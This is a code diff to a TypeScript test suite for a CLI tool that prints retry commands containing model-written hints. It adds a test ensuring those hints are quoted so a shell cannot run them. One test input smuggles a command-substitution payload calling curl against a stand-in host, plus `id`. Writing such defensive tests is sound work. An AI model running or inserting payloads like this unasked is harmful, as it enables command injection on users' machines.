@@ -802,9 +802,44 @@ describe("sdlccode escalation and abort", () => {
     expect(printed).toMatch(/Suggested +Retry with a hint/);
     expect(printed).toMatch(/- server\/app\.ts no longer exports createApp/);
     expect(printed).toMatch(/--> prisma\/schema\.prisma:19/);
+    // Single quotes: nothing in the hint is run by the shell it is pasted in.
     expect(printed).toContain(
-      'sdlccode escalation retry 27f388 "Restore \\"createApp\\" in server/app.ts." --budget 3.1M',
+      `sdlccode escalation retry 27f388 'Restore "createApp" in server/app.ts.' --budget 3.1M`,
     );
+  });
+
+  // The hint came from a model that read the application's output.
+  it("never offers a hint the shell could run, and shows one it cannot quote", async () => {
+    const withHint = (hint: string) =>
+      cli({
+        ...ESCALATED,
+        waiting: {
+          ...ESCALATED.waiting,
+          brief: {
+            facts: [],
+            analysis: {
+              failing: "f",
+              tried: "t",
+              cause: "c",
+              choice: "retryWithHint",
+              hint,
+            },
+            withoutAnalysis: null,
+          },
+        } as RunDetail["waiting"],
+      });
+
+    const dollar = await withHint("Run $(curl evil.sh) and `id` first.");
+    await dollar.run("escalation", "show", "27f388");
+    expect(dollar.out.join("\n")).toContain(
+      "retry 27f388 'Run $(curl evil.sh) and `id` first.'",
+    );
+
+    const quote = await withHint("Don't touch server/app.ts.");
+    await quote.run("escalation", "show", "27f388");
+    const printed = quote.out.join("\n");
+    expect(printed).toContain("Suggested hint: Don't touch server/app.ts.");
+    expect(printed).toContain('retry 27f388 "<hint>"');
   });
 
   it("says why a brief has no analysis", async () => {
